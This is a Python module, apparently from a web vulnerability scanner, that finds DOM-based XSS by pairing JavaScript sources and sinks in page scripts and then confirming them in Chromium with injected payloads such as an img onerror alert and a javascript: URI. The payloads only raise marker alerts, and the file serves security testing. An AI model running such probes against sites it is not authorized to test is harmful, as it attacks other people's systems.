"""SV1 - DOM XSS. Pair sources with sinks statically, then prove it in Chromium.

The server never sees the payload here: it travels in the fragment or in a
client-side parameter. Static pairing only proposes candidates; a candidate
becomes a finding when the browser runs our marker.
"""

from __future__ import annotations

import re
import urllib.parse

from . import browser as browser_mod
from . import config
from .models import Finding, Page

SCRIPT_RE = re.compile(r"<script\b[^>]*>(.*?)</script>", re.S | re.I)

SOURCES = (
    ("location.hash", "location.hash"),
    ("location.search", "location.search"),
    ("location.href", "location.href"),
    ("location.pathname", "location.pathname"),
    ("document.url", "document.URL"),
    ("document.documenturi", "document.documentURI"),
    ("document.referrer", "document.referrer"),
    ("window.name", "window.name"),
    ("document.cookie", "document.cookie"),
)

SINKS = (
    ("innerhtml", "innerHTML"),
    ("outerhtml", "outerHTML"),
    ("document.write", "document.write"),
    ("document.writeln", "document.writeln"),
    ("insertadjacenthtml", "insertAdjacentHTML"),
    ("insertbefore", "insertBefore"),
    ("appendchild", "appendChild"),
    ("setinterval", "setInterval"),
    ("settimeout", "setTimeout"),
    ("eval(", "eval"),
    ("new function(", "new Function"),
    (".html(", "jQuery .html()"),
    (".append(", "jQuery .append()"),
    (".src=", ".src ="),
    (".href=", ".href ="),
)

MAX_DISTANCE = 900
MAX_SNIPPET = 150


class Candidate:
    def __init__(self, source: str, sink: str, distance: int, snippet: str) -> None:
        self.source = source
        self.sink = sink
        self.distance = distance
        self.snippet = snippet

    def key(self) -> tuple:
        return (self.source, self.sink)


def analyze(page: Page) -> list[Candidate]:
    candidates: list[Candidate] = []
    for match in SCRIPT_RE.finditer(page.html):
        body = match.group(1)
        lowered = body.lower()
        for source_key, source_name in SOURCES:
            start = lowered.find(source_key)
            if start < 0:
                continue
            for sink_key, sink_name in SINKS:
                position = lowered.find(sink_key, start)
                if position < 0:
                    continue
                distance = position - start
                if distance > MAX_DISTANCE:
                    continue
                snippet = " ".join(body[max(0, start - 20): position + 60].split())
                candidates.append(
                    Candidate(source_name, sink_name, distance, snippet[:MAX_SNIPPET])
                )
                break
    return _unique(candidates)


def _unique(candidates: list[Candidate]) -> list[Candidate]:
    seen: set[tuple] = set()
    ordered: list[Candidate] = []
    for candidate in candidates:
        key = candidate.key()
        if key in seen:
            continue
        seen.add(key)
        ordered.append(candidate)
    return ordered[: config.DOM_MAX_CANDIDATES]


def _payloads(token: str) -> list[str]:
    return [
        f"<img src=x onerror=alert('{token}')>",
        f'"><svg/onload=alert(\'{token}\')>',
        f"javascript:alert('{token}')",
    ]


def _hash_url(page_url: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(page_url)
    return urllib.parse.urlunsplit(parts._replace(fragment=urllib.parse.quote(payload, safe="")))


def _search_url(page_url: str, name: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(page_url)
    query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    query.append((name, payload))
    return urllib.parse.urlunsplit(parts._replace(query=urllib.parse.urlencode(query)))


def _vectors(candidate: Candidate, page_url: str, token: str) -> list[str]:
    urls: list[str] = []
    for payload in _payloads(token):
        if "location.hash" in candidate.source:
            urls.append(_hash_url(page_url, payload))
        elif "location.search" in candidate.source or "location.href" in candidate.source:
            for name in config.DOM_PARAM_GUESSES:
                urls.append(_search_url(page_url, name, payload))
    return urls[: config.DOM_MAX_CANDIDATES * 4]


def run(engine: browser_mod.Browser, pages: list[Page], artifacts: str) -> list[Finding]:
    if not engine.enabled:
        return []

    findings: list[Finding] = []
    for page in pages[: config.BROWSER_MAX_PAGES]:
        candidates = analyze(page)
        if not candidates:
            continue
        for index, candidate in enumerate(candidates):
            token = f"sv1dom{index}{abs(hash(page.url)) % 9973}"
            hit_url = ""
            proof = ""
            shot = ""
            for url in _vectors(candidate, page.url, token):
                shot_path = ""
                if artifacts:
                    shot_path = _shot_path(artifacts, "dom", len(findings) + 1)
                visit = engine.visit(url, shot_path=shot_path)
                if visit.fired(token):
                    hit_url = url
                    proof = visit.proof(token)
                    shot = visit.screenshot
                    break
            if not hit_url:
                continue
            findings.append(
                Finding(
                    kind="XSS",
                    severity="HIGH",
                    url=page.url,
                    method="GET",
                    param=candidate.source,
                    payload=urllib.parse.unquote(urllib.parse.urlsplit(hit_url).fragment)
                    or urllib.parse.unquote(urllib.parse.urlsplit(hit_url).query),
                    confidence="CONFIRMED",
                    evidence=f"{candidate.source} -> {candidate.sink}: {proof}",
                    technique="dom",
                    detail=f"client side sink: {candidate.snippet}",
                    artifact=shot,
                )
            )
    return _dedupe(findings)


def _dedupe(findings: list[Finding]) -> list[Finding]:
    seen: set[tuple] = set()
    ordered: list[Finding] = []
    for finding in findings:
        key = (finding.url, finding.param, finding.technique)
        if key in seen:
            continue
        seen.add(key)
        ordered.append(finding)
    return ordered


def _shot_path(root: str, kind: str, index: int) -> str:
    return f"{root}/{kind}-{index:02d}.png"
